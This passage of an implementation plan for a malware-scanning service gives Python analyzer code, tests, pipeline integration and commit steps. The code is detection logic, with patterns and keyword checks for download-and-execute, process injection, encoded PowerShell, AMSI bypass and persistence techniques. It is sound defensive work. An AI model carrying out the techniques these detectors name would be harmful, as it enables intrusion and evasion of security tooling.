                "type": "heavy_obfuscation",
                "severity": "medium",
                "detail": f"Obfuscation score: {obf_score}/100",
            })

        # --- Extract operations / indicators ---

        # Network indicators
        urls = _URL_RE.findall(content)
        ips = _IP_RE.findall(content)
        domains = _DOMAIN_RE.findall(content)
        features["network_indicators"] = {
            "urls": urls[:50],
            "ips": list(set(ips))[:20],
            "domains": list(set(domains))[:20],
        }
        extracted_strings.extend(urls[:20])

        # Download operations
        download_matches = _DOWNLOAD_RE.findall(content)
        features["download_operations"] = download_matches[:20]

        # Exec operations
        exec_matches = _EXEC_RE.findall(content)
        features["exec_operations"] = exec_matches[:20]

        # Process injection
        injection_matches = _INJECTION_RE.findall(content)
        features["process_operations"] = injection_matches[:20]
        if injection_matches:
            indicators.append({
                "type": "process_injection",
                "severity": "critical",
                "detail": f"Process injection APIs found: {', '.join(injection_matches[:5])}",
                "evidence": {"apis": injection_matches[:10]},
            })

        # Download + execute = critical
        if download_matches and exec_matches:
            indicators.append({
                "type": "download_and_execute",
                "severity": "critical",
                "detail": "Script downloads content and executes it",
                "evidence": {
                    "download": download_matches[:5],
                    "execute": exec_matches[:5],
                },
            })

        # Encoded command execution
        enc_match = _ENCODED_CMD_RE.search(content)
        if enc_match:
            encoded_payload = enc_match.group(1)
            decoded = ""
            try:
                raw_decoded = base64.b64decode(encoded_payload)
                decoded = raw_decoded.decode("utf-16-le", errors="replace")[:500]
            except Exception:
                pass
            indicators.append({
                "type": "encoded_command_execution",
                "severity": "critical",
                "detail": "Base64 encoded command with execution",
                "evidence": {"encoded": encoded_payload[:200], "decoded": decoded},
            })
            if decoded:
                extracted_strings.append(decoded)

        # Base64 decode → exec
        b64_strings = re.findall(r"[A-Za-z0-9+/=]{100,}", content)
        for b64_str in b64_strings[:5]:
            try:
                decoded_bytes = base64.b64decode(b64_str)
                decoded_text = decoded_bytes.decode("utf-8", errors="replace")
                if any(kw in decoded_text.lower() for kw in ("invoke", "exec", "eval", "shell", "download")):
                    extracted_strings.append(decoded_text[:500])
            except Exception:
                pass
        features["encoded_strings"] = extracted_strings[:20]

        # Registry persistence
        if _REGISTRY_PERSIST_RE.search(content):
            indicators.append({
                "type": "registry_persistence",
                "severity": "high",
                "detail": "Registry Run/RunOnce key modification detected",
            })
        features["registry_operations"] = bool(_REGISTRY_PERSIST_RE.search(content))

        # Scheduled task
        if _SCHTASK_RE.search(content):
            indicators.append({
                "type": "scheduled_task",
                "severity": "high",
                "detail": "Scheduled task creation detected",
            })

        # Service creation
        if _SERVICE_RE.search(content):
            indicators.append({
                "type": "service_creation",
                "severity": "high",
                "detail": "Service creation detected",
            })

        # AMSI bypass
        if _AMSI_RE.search(content):
            indicators.append({
                "type": "amsi_bypass",
                "severity": "high",
                "detail": "AMSI bypass technique detected",
            })

        # Execution policy bypass
        if _EXEC_POLICY_RE.search(content):
            indicators.append({
                "type": "execution_policy_bypass",
                "severity": "medium",
                "detail": "-ExecutionPolicy Bypass detected",
            })

        # WMI execution
        if _WMI_RE.search(content):
            indicators.append({
                "type": "wmi_execution",
                "severity": "medium",
                "detail": "WMI-based process execution detected",
            })

        # Environment discovery
        if _DISCOVERY_RE.search(content):
            indicators.append({
                "type": "environment_discovery",
                "severity": "low",
                "detail": "Environment/host discovery commands detected",
            })

        # Sleep/delay
        if _SLEEP_RE.search(content):
            indicators.append({
                "type": "sleep_or_delay",
                "severity": "low",
                "detail": "Sleep/delay pattern detected",
            })

        # File operations (basic detection)
        file_ops = re.findall(
            r"(Copy-Item|Move-Item|Remove-Item|New-Item|Set-Content|"
            r"Out-File|fso\.(?:Create|Delete|Move|Copy)|"
            r"FileSystemObject|CreateTextFile|DeleteFile)",
            content, re.IGNORECASE,
        )
        features["file_operations"] = file_ops[:20]

        risk_score = _compute_risk_score(indicators)
        risk_factors = [ind["detail"] for ind in indicators if ind["severity"] in ("critical", "high", "medium")]

        return AnalyzerResult(
            analyzer_name=self.name,
            format_type=script_type,
            indicators=indicators,
            features=features,
            extracted_strings=extracted_strings[:200],
            risk_score=risk_score,
            risk_factors=risk_factors,
            errors=errors,
            extracted_artifacts=[],
        )

    def _detect_type(self, file_path: Path, original_filename: str, raw: bytes) -> str:
        """Determine script type from extension, MIME, or content."""
        # Check original filename extension first
        if original_filename:
            ext = Path(original_filename).suffix.lower()
            if ext in _EXT_MAP:
                return _EXT_MAP[ext]

        # Check file path extension
        ext = file_path.suffix.lower()
        if ext in _EXT_MAP:
            return _EXT_MAP[ext]

        # Content sniff
        for script_type, pattern in _CONTENT_SNIFF:
            if pattern.search(raw[:4096]):
                return script_type

        return "Script"
```

- [ ] **Step 4: Run tests — verify they pass**

Run: `cd worker && poetry run pytest tests/analyzers/test_script_analyzer.py -v`

Expected: All tests PASS.

- [ ] **Step 5: Commit**

```bash
git add worker/src/malscan_worker/analyzers/script_analyzer.py worker/tests/analyzers/test_script_analyzer.py
git commit -m "feat: add ScriptAnalyzer with obfuscation scoring and indicator detection"
```

---

## Task 9: FormatAnalysisStage

**Files:**
- Create: `worker/src/malscan_worker/stages/format_analysis.py`
- Create: `worker/tests/test_format_analysis_stage.py`

- [ ] **Step 1: Write failing tests for FormatAnalysisStage**

Create `worker/tests/test_format_analysis_stage.py`:

```python
"""Tests for FormatAnalysisStage."""

import uuid
from datetime import datetime, timezone
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from malscan_worker.stages.base import StageContext, StageResult
from malscan_worker.stages.format_analysis import FormatAnalysisStage


def _make_ctx(file_path: Path, mime: str = "", original_filename: str = "test.bin") -> StageContext:
    ctx = StageContext(
        job_id=str(uuid.uuid4()),
        file_id=str(uuid.uuid4()),
        storage_key="deadbeef" * 8,
        sha256="deadbeef" * 8,
        original_filename=original_filename,
        file_path=file_path,
    )
    ctx.previous_results = [
        StageResult(
            stage_name="file-type",
            status="ok",
            started_at=datetime.now(timezone.utc),
            ended_at=datetime.now(timezone.utc),
            duration_ms=1,
            findings={"mime_type": mime},
            artifacts=[],
        )
    ]
    return ctx


class TestFormatAnalysisStageProperties:
    def test_name(self):
        stage = FormatAnalysisStage()
        assert stage.name == "format-analysis"


@pytest.mark.asyncio
class TestFormatAnalysisStageExecute:
    async def test_skip_when_no_file(self, tmp_path):
        ctx = _make_ctx(tmp_path / "nonexistent.bin")
        ctx.file_path = tmp_path / "nonexistent.bin"
        stage = FormatAnalysisStage()

        result = await stage.execute(ctx)

        assert result.status == "skipped"
        assert result.stage_name == "format-analysis"

    async def test_skip_when_no_analyzer_matches(self, tmp_path):
        """A plain text file should not match any analyzer."""
        f = tmp_path / "test.txt"
        f.write_bytes(b"just plain text, nothing special here at all")
        ctx = _make_ctx(f, "text/plain", "test.txt")
        stage = FormatAnalysisStage()

        result = await stage.execute(ctx)

        assert result.status == "skipped"

    async def test_dispatches_to_pe_analyzer(self, tmp_path):
        """A PE file should dispatch to the PE analyzer."""
        import struct
        # Build minimal PE
        dos_header = bytearray(64)
        dos_header[0:2] = b"MZ"
        struct.pack_into("<I", dos_header, 60, 64)
        pe_sig = b"PE\x00\x00"
        file_header = struct.pack("<HHIIIHH", 0x14C, 1, 0x60000000, 0, 0, 0xE0, 0x0002)
        opt_header = bytearray(0xE0)
        struct.pack_into("<H", opt_header, 0, 0x10B)
        opt_header[28:32] = struct.pack("<I", 0x400000)
        opt_header[32:36] = struct.pack("<I", 0x1000)
        opt_header[36:40] = struct.pack("<I", 0x200)
        opt_header[64:68] = struct.pack("<I", 0x3000)
        opt_header[60:64] = struct.pack("<I", 0x200)
        struct.pack_into("<I", opt_header, 116, 16)
        section = bytearray(40)
        section[0:6] = b".text\x00"
        struct.pack_into("<I", section, 8, 0x100)
        struct.pack_into("<I", section, 12, 0x1000)
        struct.pack_into("<I", section, 16, 0x200)
        struct.pack_into("<I", section, 20, 0x200)
        struct.pack_into("<I", section, 36, 0x60000020)
        header_data = bytes(dos_header) + pe_sig + file_header + bytes(opt_header) + bytes(section)
        padding = b"\x00" * (0x200 - len(header_data))
        pe_bytes = header_data + padding + b"\xCC" * 0x200

        f = tmp_path / "test.exe"
        f.write_bytes(pe_bytes)
        ctx = _make_ctx(f, "application/x-dosexec", "test.exe")
        stage = FormatAnalysisStage()

        result = await stage.execute(ctx)

        assert result.status == "ok"
        assert result.findings.get("analyzer") == "pe"

    async def test_dispatches_to_script_analyzer(self, tmp_path):
        f = tmp_path / "test.ps1"
        f.write_bytes(b"Write-Host 'Hello'\nGet-Process")
        ctx = _make_ctx(f, "text/plain", "test.ps1")
        stage = FormatAnalysisStage()

        result = await stage.execute(ctx)

        assert result.status == "ok"
        assert result.findings.get("analyzer") == "script"

    async def test_result_contains_expected_fields(self, tmp_path):
        f = tmp_path / "test.ps1"
        f.write_bytes(b"Write-Host 'Hello'")
        ctx = _make_ctx(f, "text/plain", "test.ps1")
        stage = FormatAnalysisStage()

        result = await stage.execute(ctx)

        assert result.status == "ok"
        findings = result.findings
        assert "analyzer" in findings
        assert "format_type" in findings
        assert "risk_score" in findings
        assert "indicators" in findings
        assert "features" in findings

    async def test_handles_analyzer_exception(self, tmp_path):
        """If an analyzer raises, the stage should return failed, not crash."""
        f = tmp_path / "test.ps1"
        f.write_bytes(b"Write-Host 'Hello'")
        ctx = _make_ctx(f, "text/plain", "test.ps1")
        stage = FormatAnalysisStage()

        # Patch the analyzer's analyze method to raise
        with patch.object(stage._registry, "detect") as mock_detect:
            mock_analyzer = MagicMock()
            mock_analyzer.name = "script"
            mock_analyzer.analyze = AsyncMock(side_effect=RuntimeError("boom"))
            mock_detect.return_value = mock_analyzer

            result = await stage.execute(ctx)

        assert result.status == "failed"
        assert "boom" in (result.error or "")
```

- [ ] **Step 2: Run tests — verify they fail**

Run: `cd worker && poetry run pytest tests/test_format_analysis_stage.py -v`

Expected: ImportError.

- [ ] **Step 3: Implement FormatAnalysisStage**

Create `worker/src/malscan_worker/stages/format_analysis.py`:

```python
"""Format analysis stage — dispatches to format-specific analyzers."""

from __future__ import annotations

import hashlib
import os
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

import structlog
from malscan.config import get_settings

from malscan_worker.analyzers.registry import AnalyzerRegistry, get_default_analyzer_registry
from malscan_worker.db import create_artifact
from malscan_worker.stages.base import Stage, StageContext, StageResult
from malscan_worker.utils.submission import InternalJobSubmitter

log = structlog.get_logger()


class FormatAnalysisStage(Stage):
    """Dispatch to format-specific analyzers based on detected file type."""

    def __init__(self) -> None:
        self._registry = get_default_analyzer_registry()

    @property
    def name(self) -> str:
        return "format-analysis"

    async def execute(self, ctx: StageContext) -> StageResult:
        started_at = datetime.now(timezone.utc)

        # Skip if no file
        if not ctx.file_path or not ctx.file_path.exists():
            return self._result(started_at, "skipped", {"reason": "File not found"})

        # Get MIME from file-type stage
        mime = self._get_mime(ctx)

        # Find matching analyzer
        analyzer = self._registry.detect(ctx.file_path, mime)
        if analyzer is None:
            return self._result(started_at, "skipped", {"reason": "No format analyzer matched"})

        log.info(
            "format_analyzer_dispatching",
            job_id=ctx.job_id,
            analyzer=analyzer.name,
            mime=mime,
        )

        try:
            result = await analyzer.analyze(ctx.file_path, ctx)
        except Exception as e:
            log.error(
                "format_analyzer_error",
                job_id=ctx.job_id,
                analyzer=analyzer.name,
                error=str(e),
                exc_info=True,
            )
            ended_at = datetime.now(timezone.utc)
            return StageResult(
                stage_name=self.name,
                status="failed",
                started_at=started_at,
                ended_at=ended_at,
                duration_ms=int((ended_at - started_at).total_seconds() * 1000),
                findings={"analyzer": analyzer.name},
                artifacts=[],
                error=str(e),
            )

        # Submit extracted artifacts as sub-jobs
        sub_jobs = 0
        if result.extracted_artifacts and ctx.job:
            try:
                sub_jobs = await self._submit_artifacts(ctx, result.extracted_artifacts)
            except Exception as e:
                log.error("format_analysis_submit_error", error=str(e), exc_info=True)
                result.errors.append(f"Artifact submission error: {e}")

        return self._result(
            started_at,
            "ok",
            {
                "analyzer": result.analyzer_name,
                "format_type": result.format_type,
                "risk_score": result.risk_score,
                "risk_factors": result.risk_factors,
                "indicators": result.indicators,
                "features": result.features,
                "extracted_strings": result.extracted_strings[:200],
                "extracted_artifacts_count": len(result.extracted_artifacts),
                "sub_jobs_created": sub_jobs,
                "errors": result.errors,
            },
        )

    async def _submit_artifacts(
        self,
        ctx: StageContext,
        artifacts: list[dict[str, Any]],
    ) -> int:
        """Submit extracted artifacts as sub-jobs with artifact records.

        Follows the same pattern as DocumentAnalysisStage._submit_artifacts.
        """
        settings = get_settings()
        max_depth = getattr(settings, "max_job_depth", 3)
        if ctx.job and ctx.job.depth >= max_depth:
            log.info("format_analysis_max_depth_reached", depth=ctx.job.depth)
            return 0

        parent_job_id = str(ctx.job.id) if ctx.job else ctx.job_id
        parent_job_depth = ctx.job.depth if ctx.job else 0

        root_artifact_id = ctx.root_artifact_id
        parent_artifact_id = ctx.artifact_id

        if not root_artifact_id and ctx.job and artifacts:
            root_art = await create_artifact(
                parent_id=None,
                root_id=None,
                depth=0,
                sha256=ctx.sha256,
                size=os.path.getsize(ctx.file_path) if ctx.file_path else 0,
                original_filename=ctx.original_filename,
                extraction_source="format-analysis",
                root_job_id=ctx.job_id,
                job_id=ctx.job_id,
            )
            root_artifact_id = root_art["id"]
            parent_artifact_id = root_artifact_id

        submitter = await InternalJobSubmitter.get_instance()
        submitted = 0
        seen_hashes: set[str] = set()
        ancestor_hashes = ctx.ancestor_hashes or set()

        for art_info in artifacts:
            art_path = art_info.get("path", "")
            if not art_path or not os.path.exists(art_path):
                continue

            file_size = os.path.getsize(art_path)
            with open(art_path, "rb") as f:
                file_sha256 = hashlib.sha256(f.read()).hexdigest()

            original_name = art_info.get("filename", os.path.basename(art_path))
            origin_path = art_info.get("origin_path", original_name)

            # Cycle detection
            if file_sha256 in ancestor_hashes:
                log.warning("format_analysis_cycle_detected", sha256=file_sha256)
                continue

            # Extraction-level dedup
            skip = file_sha256 in seen_hashes
            seen_hashes.add(file_sha256)

            artifact_record = await create_artifact(
                parent_id=parent_artifact_id,
                root_id=root_artifact_id,
                depth=parent_job_depth + 1,
                sha256=file_sha256,
                size=file_size,
                original_filename=original_name,
                origin_path=origin_path,
                extraction_source="format-analysis",
                root_job_id=ctx.job_id,
                verdict="skipped" if skip else None,
                extraction_note="duplicate_within_extraction" if skip else None,
            )

            if skip:
                continue

            sub_job_id = await submitter.submit_subjob(
                file_path=art_path,
                filename=original_name,
                content_type="application/octet-stream",
                sha256_hash=file_sha256,
                file_size=file_size,
                parent_job_id=parent_job_id,
                parent_job_depth=parent_job_depth,
                artifact_id=artifact_record["id"],
                root_artifact_id=root_artifact_id,
                ancestor_hashes=ancestor_hashes | {ctx.sha256},
            )
            if sub_job_id:
                submitted += 1

        return submitted

    @staticmethod
    def _get_mime(ctx: StageContext) -> str:
        """Pull MIME from the file-type stage result."""
        for r in ctx.previous_results:
            if r.stage_name == "file-type":
                return r.findings.get("mime_type", "")
        return ""

    def _result(self, started_at: datetime, status: str, findings: dict[str, Any]) -> StageResult:
        ended_at = datetime.now(timezone.utc)
        return StageResult(
            stage_name=self.name,
            status=status,
            started_at=started_at,
            ended_at=ended_at,
            duration_ms=int((ended_at - started_at).total_seconds() * 1000),
            findings=findings,
            artifacts=[],
        )
```

- [ ] **Step 4: Run tests — verify they pass**

Run: `cd worker && poetry run pytest tests/test_format_analysis_stage.py -v`

Expected: All tests PASS.

- [ ] **Step 5: Commit**

```bash
git add worker/src/malscan_worker/stages/format_analysis.py worker/tests/test_format_analysis_stage.py
git commit -m "feat: add FormatAnalysisStage dispatching to analyzer registry"
```

---

## Task 10: Pipeline Integration

**Files:**
- Modify: `worker/src/malscan_worker/pipeline.py`

This task modifies the pipeline to add the format analysis phase and scoring integration.

- [ ] **Step 1: Add FormatAnalysisStage import and phase constant**

In `worker/src/malscan_worker/pipeline.py`, add the import after line 28 (the SandboxStage import):

```python
from malscan_worker.stages.format_analysis import FormatAnalysisStage
```

- [ ] **Step 2: Add FORMAT_ANALYSIS_STAGE and remove DocumentAnalysisStage from SEQUENTIAL_STAGES**

Replace the stage definitions (lines 37-52):

```python
# Stages that can run in parallel (Strictly no database writers here!)
PARALLEL_STAGES = [
    FileTypeStage(),
    ClamAVStage(),
    YaraStage(),
    IocExtractStage(),
]

# Format-specific analysis (runs after parallel stages, needs file-type result)
FORMAT_ANALYSIS_STAGE = FormatAnalysisStage()

# Stages that should run sequentially
# ArchiveExtractStage MUST be here because it writes to the DB,
# and AsyncSession is not concurrency-safe.
# NOTE: DocumentAnalysisStage is now handled via OfficeAnalyzerAdapter
# inside FormatAnalysisStage.
SEQUENTIAL_STAGES = [
    ArchiveExtractStage(),
    SandboxStage(),
]
```

- [ ] **Step 3: Update total_stages count and add format analysis phase to run_pipeline**

In `run_pipeline()`, update the total_stages calculation (line 318):

```python
    total_stages = len(PARALLEL_STAGES) + 1 + len(SEQUENTIAL_STAGES)  # +1 for format analysis
```

After the parallel stages block (after line 378 `stages_done += len(PARALLEL_STAGES)`), add:

```python
            # 2. Run Format Analysis Stage (NEW)
            format_result = await _run_stage(FORMAT_ANALYSIS_STAGE, ctx)
            results.append(format_result)
            ctx.previous_results.append(format_result)
            stages_done += 1
```

- [ ] **Step 4: Add format-analysis scoring block to _build_analysis_result**

In `_build_analysis_result()`, after the document analysis scoring block (after line 167), add:

```python
    # ------------------------------------------------------------------
    # Format-specific analysis scoring
    # ------------------------------------------------------------------
    fmt = stage_findings.get("format-analysis", {})
    fmt_indicators = fmt.get("indicators", [])
    fmt_risk_score = fmt.get("risk_score", 0)

    if fmt_indicators:
        critical_inds = [i for i in fmt_indicators if i.get("severity") == "critical"]
        high_inds = [i for i in fmt_indicators if i.get("severity") == "high"]
        medium_inds = [i for i in fmt_indicators if i.get("severity") == "medium"]

        if critical_inds:
            verdict = "malicious"
            score = max(score, 85)
        if high_inds and verdict == "clean":
            verdict = "suspicious"
            score = max(score, 60)
        if medium_inds and verdict == "clean":
            verdict = "suspicious"

        score = max(score, fmt_risk_score)
```

- [ ] **Step 5: Add format_analysis section to report output**

In the `return` dict of `_build_analysis_result()` (around line 235), add `format_analysis` to the results:

```python
        "results": {
            "av_result": {
                "engine": "ClamAV",
                "infected": clamav.get("infected", False),
                "threat_name": clamav.get("threat_name"),
            },
            "yara_hits": yara_matches,
            "iocs": iocs,
            "format_analysis": {
                "analyzer": fmt.get("analyzer"),
                "format_type": fmt.get("format_type"),
                "risk_score": fmt_risk_score,
                "risk_factors": fmt.get("risk_factors", []),
                "indicators": fmt_indicators,
                "features": fmt.get("features", {}),
            } if fmt.get("analyzer") else {},
            "document_analysis": doc_analysis,
            "sandbox": stage_findings.get("sandbox", {}),
            "archive_extract": stage_findings.get("archive-extract", {}),
        },
```

- [ ] **Step 6: Remove the DocumentAnalysisStage import (now unused in pipeline)**

Remove line 25 from the imports:

```python
from malscan_worker.stages.document_analysis import DocumentAnalysisStage
```

Note: Keep the import in `office_adapter.py` where it's still used. The `DocumentAnalysisStage` class itself is untouched.

- [ ] **Step 7: Run existing pipeline tests to verify no regressions**

Run: `cd worker && poetry run pytest tests/ -v --timeout=60`

Expected: All tests pass (existing tests may need minor adjustments if they expect `DocumentAnalysisStage` in `SEQUENTIAL_STAGES`).

- [ ] **Step 8: Commit**

```bash
git add worker/src/malscan_worker/pipeline.py
git commit -m "feat: integrate FormatAnalysisStage into pipeline with scoring and reporting"
```

---

## Task 11: Full Test Suite Verification

- [ ] **Step 1: Run the complete test suite**

Run: `cd worker && poetry run pytest tests/ -v --timeout=120`

Expected: All tests PASS with no failures.

- [ ] **Step 2: Run type checking**

Run: `cd worker && poetry run mypy src/malscan_worker/analyzers/ src/malscan_worker/stages/format_analysis.py --ignore-missing-imports`

Expected: No errors.

- [ ] **Step 3: Run linting**

Run: `cd worker && poetry run ruff check src/malscan_worker/analyzers/ src/malscan_worker/stages/format_analysis.py`

Expected: No errors, or fix any issues.

- [ ] **Step 4: Fix any failures and commit**

If any tests, type checks, or linting fail, fix them and commit:

```bash
git add -A
git commit -m "fix: address test/lint/type issues in format analyzer layer"
```

---

## Summary

| Task | Component | Test Count | New Files |
|------|-----------|------------|-----------|
| 1 | Dependencies | 0 | 0 |
| 2 | AnalyzerResult + FormatAnalyzer ABC | 4 | 4 |
| 3 | AnalyzerRegistry | 7 | 2 |
| 4 | PEAnalyzer | 7 | 2 |
| 5 | OfficeAnalyzerAdapter | 8 | 2 |
| 6 | PDFAnalyzer | 7 | 2 |
| 7 | LNKAnalyzer | 5 | 2 |
| 8 | ScriptAnalyzer | 12 | 2 |
| 9 | FormatAnalysisStage | 6 | 2 |
| 10 | Pipeline Integration | 0 | 0 (modify) |
| 11 | Full Verification | 0 | 0 |
| **Total** | | **~56** | **18** |
